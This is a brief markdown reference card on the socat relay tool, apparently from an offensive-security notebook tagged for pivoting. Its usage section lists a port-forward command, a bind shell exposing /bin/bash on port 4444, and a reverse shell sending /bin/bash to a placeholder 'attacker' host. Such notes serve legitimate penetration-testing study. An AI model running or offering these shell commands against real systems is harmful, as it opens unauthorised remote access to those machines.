---
tags: [tool, network, relay]
tool: "socat"
category: "Network Performance"
installed: true
phase: [pivoting]
---

# socat - Multipurpose Relay

## Overview
Bidirectional data relay

## Location
/usr/bin/socat

## Basic Usage
socat TCP-LISTEN:8080,fork TCP:target:80
socat TCP-LISTEN:4444 EXEC:/bin/bash
socat EXEC:/bin/bash TCP:attacker:4444

## Common Options
TCP-LISTEN : Listen on TCP
EXEC : Execute program
fork : Handle multiple connections

## Related Tools
netcat, ncat
